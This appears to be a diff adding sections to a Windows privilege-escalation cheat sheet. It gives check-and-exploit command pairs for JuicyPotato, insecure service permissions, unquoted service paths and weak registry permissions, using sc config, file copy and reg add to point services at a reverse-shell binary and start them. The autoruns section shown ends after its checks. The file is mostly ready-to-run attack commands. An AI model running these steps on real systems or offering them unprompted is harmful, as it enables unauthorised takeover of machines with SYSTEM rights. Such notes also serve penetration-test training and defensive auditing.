@@ -17,3 +17,46 @@ exploit
 5) JuicyPotato.exe -p fullpathtopriv.bat -l port -t * -c {CLSID}
 
 Here are the CLSID's - http://ohpe.it/juicy-potato/CLSID/
+
+------INSECURE SERVICE PERMISSIONS------
+
+how to check? 
+
+accesschk.exe /accepteula -uwcqv user service # SERVICE_CHANGE_CONFIG priv
+sc qc service # SYSTEM or local admin priv
+
+exploit 
+
+sc config service binpath= "\"path_to_reverse_shell""
+net start service
+
+------UNQUOTED SERVICE PATH------
+
+how to check?
+
+sc qc service # SYSTEM or local admin priv and BINARY_PATH_NAME is unquoted and contains spaces
+accesschk.exe /accepteula -uwdq "path" # check on write permission
+
+exploit
+
+copy path_to_reverse_shell "path" # change reverse shell name on part of unquoted name with
+net start service
+
+------WEAK REGISTRY PERMISSIONS------
+
+how to check?
+
+sc qc regsvc # SYSTEM or local admin priv
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # check on write permission
+
+exploit
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "path_to_revers_shell" /f
+net start regsvc
+
+------AUTORUNS------
+
+how to check?
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run # get autoruns
+accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" # check on write permission
